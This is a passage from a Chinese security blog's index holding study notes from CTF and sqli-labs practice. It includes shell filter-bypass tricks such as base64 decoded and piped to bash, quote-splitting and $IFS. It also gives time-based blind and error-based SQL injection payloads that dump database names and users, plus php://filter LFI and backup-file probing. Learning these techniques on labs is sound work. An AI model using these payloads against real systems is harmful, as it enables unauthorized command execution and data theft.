href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><blockquote><ul><li>system()</li><li>passthru()</li><li>exec()</li><li>shell_exec()</li><li>popen()</li><li>proc_open()</li><li>pcntl_exec()</li><li>反引号 同shell_exec()</li></ul></blockquote><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><blockquote><p>a&#x3D;c;b&#x3D;at;c&#x3D;fl;d&#x3D;ag;$a$b $c$d</p></blockquote><h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><blockquote><p>echo “Y2F0IGZsYWc&#x3D;”|base64 -d<br>echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash (在bash被过滤的情况下可尝试sh)</p></blockquote><h4 id="单引号、双引号"><a href="#单引号、双引号" class="headerlink" title="单引号、双引号"></a>单引号、双引号</h4><blockquote><p>c””at fl’’ag</p></blockquote><h4 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线"></a>反斜线</h4><blockquote><p>c\at fl\ag</p></blockquote><h4 id="正则-假设-x2F-bin-x2F-cat-test-是一个目录"><a href="#正则-假设-x2F-bin-x2F-cat-test-是一个目录" class="headerlink" title="正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)"></a>正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)</h4><blockquote><p>&#x2F;???&#x2F;?[a][t] ?’’?’’?’’?’’<br>&#x2F;???&#x2F;?at ????<br>&#x2F;???&#x2F;?[a]’’[t] ?’’?’’?’’?’’</p></blockquote><h4 id="1、-2等和"><a href="#1、-2等和" class="headerlink" title="$1、$2等和$@"></a>$1、$2等和$@</h4><blockquote><ul><li>$# 是传给脚本的参数个数</li><li>$0 是脚本本身的名字</li><li>$1 是传递给该shell脚本的第一个参数</li><li>$2 是传递给该shell脚本的第二个参数</li><li>$@ 是传给脚本的所有参数的列表</li><li>$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个</li><li>$$ 是脚本运行的当前进程ID号</li><li>$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</li></ul></blockquote><h2 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h2><blockquote><p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:可以查看<br>file -f:报错出具体内容</p></blockquote><h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><blockquote><p>cat$IFS$9<code>ls</code><br>cat$IFS$9$(ls)</p></blockquote><p>(内联，就是将&#96;&#96;或$()内命令的输出作为输入执行)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>每周报告</title>
    <link href="/2023/04/15/my-blogneirong/"/>
    <url>/2023/04/15/my-blogneirong/</url>
    
    <content type="html"><![CDATA[<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>在通关sqllabs第9关与第10关时我们知道了时间盲注这一概念，<br>用时间盲注来判断注入点是否正确，使用sleep延迟函数。<br>if()函数条件判断函数<br>if(a,b,c)   if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;<br>sleep()函数网页延迟n秒后，输出结果<br>left（）函数             从左边数，取几个数<br>例如：left（abcdef，3）  取3位左边的数，就是abc  </p><ol><li>判断注入点：?id&#x3D;1 and sleep(10)–+ 如若页面加载则判断正确，否则尝试其他</li><li>爆库：?id&#x3D;1’ and if (length(database()) &#x3D; 8 ,sleep(4),1)–+ 如若延时则正确，?id&#x3D;1’ and If((substr(database(),1,1)&#x3D;’s’),sleep(5),1)–+ 挨个尝试找出八个字符库名security</li><li>爆表名：?id&#x3D;1’ and If((substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),1,1))&#x3D;‘u‘,sleep(4),1)–+ 等于users</li><li>爆字段：?id&#x3D;1’ and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() limit 0,1),1,1))&#x3D;105,sleep(4),1)–+</li><li>爆数据：?id&#x3D;1’ and If( (substr((select username from users limit 0,1),1,1))&#x3D;’a’,sleep(4),1)–+</li></ol><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在sqllabs 第13关中，可以测试出闭合点，但没有回显位，无法重复11，12题中的操作，所以这里我们尝试使用报错注入<br>1’)  and updatexml(1,concat(0x7e,(database()),0x7e),1) #<br><strong>虽然报错，但我们知道了库名为security</strong><br>1’)  and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’),0x7e),1) #<br><strong>再求得表名</strong><br>1’)  and updatexml(1,concat(0x7e,(select group_concat(username)from users),0x7e),1) #<br><strong>再求得字段</strong><br>可求得username 和 password</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>在24关中需要用到二次注入的原理，二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户 输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br><strong>第一步：插入恶意数据</strong><br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br><strong>第二步：引用恶意数据</strong><br>开发者默认存入数据库的数据都是安全的，在进行查询的时候，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><p>在25，26关都过滤了or和and 所以遇到有or或and的地方需要双写，<br>例：information-&gt;information&amp;&amp;password-&gt;passwoorrd<br>但26关也过滤掉了空格和注释符，这时可以采用报错法求得，空格可用“%a0” 或 “%0b” 替代空格，同时可以使用）来代替空格的划分作用，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”。<br><strong>管道符（Linux管道命令操作符）：</strong><br><img src="/./images/heiheihei.jpg" alt="Linux管道命令操作符"><br>Linux-&gt;ls-&gt;list-&gt;列表-&gt;显示指定工作目录下的内容<br>Linux-&gt;cat-&gt;用于连接文件并打印到标准输出设备上</p><h2 id="filter伪协议"><a href="#filter伪协议" class="headerlink" title="filter伪协议"></a>filter伪协议</h2><p>php:&#x2F;&#x2F;filter是php中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如base64编码处理，rot13处理等。官方解释为：php:&#x2F;&#x2F;filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。<br>Filter协议的一般语法为：php:&#x2F;&#x2F;filter&#x2F;过滤器|过滤器&#x2F;resource&#x3D;待过滤的数据流<br><strong>通过php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D; 利用LFI来查看源码</strong><br><a href="https://blog.csdn.net/qq_29419013/article/details/81201494">filter详细信息</a><br><a href="https://zhuanlan.zhihu.com/p/50445145">filter详细信息</a></p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>如果服务器传入数据库的数据是gbk等宽字节编码，可以在特殊字符之前增加一个十六进制字节，和转义符构成一个汉字字符，从而把转义符吃掉。<br><a href="https://blog.csdn.net/weixin_42040292/article/details/90719507">宽字节注入</a><br><strong>Referer: 服务器伪造</strong><br><strong>X-Forwarded-For:用于修改ip</strong></p><p><strong>常见的网站源码备份文件后缀:</strong></p><ul><li>tar.gz，zip，rar，tar<br><strong>常见的网站源码备份文件名：</strong><br>web，website，backup，back，www，wwwroot，temp<br><strong>常见的备份文件后缀名有：</strong></li><li>.git .svn .swp .~ .bak .bash_history</li></ul><h2 id="php序列化与反序列化"><a href="#php序列化与反序列化" class="headerlink" title="php序列化与反序列化"></a>php序列化与反序列化</h2><p> <strong>序列化</strong>是将变量转换为可保存或传输的字符串的过程；<strong>反序列化</strong>就是在适当的时候把这个字符串再转化成原来的变量使用。这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p> <strong>弱比较：</strong>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
